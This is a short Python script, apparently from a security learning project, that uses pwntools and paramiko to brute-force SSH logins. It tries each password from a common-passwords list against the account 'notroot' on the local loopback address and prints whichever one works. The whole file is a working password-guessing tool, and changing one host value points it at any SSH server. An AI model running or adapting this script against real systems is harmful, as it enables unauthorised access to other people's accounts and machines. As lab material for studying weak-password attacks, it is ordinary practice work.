from pwn import *
import paramiko

HOST = '127.0.0.1' #our own loopback ip for this project
USERNAME = "notroot"
attempts = 0

with open ('top20ssh-common-passwords.txt', 'r') as file:
	for password in file:
		password = password.strip('\n')
		try:
			print(f"[{attempts}] Attempting password: '{password}'!")
			response = ssh(host=HOST, user=USERNAME, password=password, timeout=1)
			if response.connected(): 
				print(f">>> Valid password found: '{password}'!")
				response.close()
				break
			response.close()

		except paramiko.ssh_exception.AuthenticationException: #Login failed (wrong password, wrong user, etc.)
			print("[X] Invalid password!")
		attempts+=1

#https://docs.pwntools.com/en/stable/tubes/ssh.html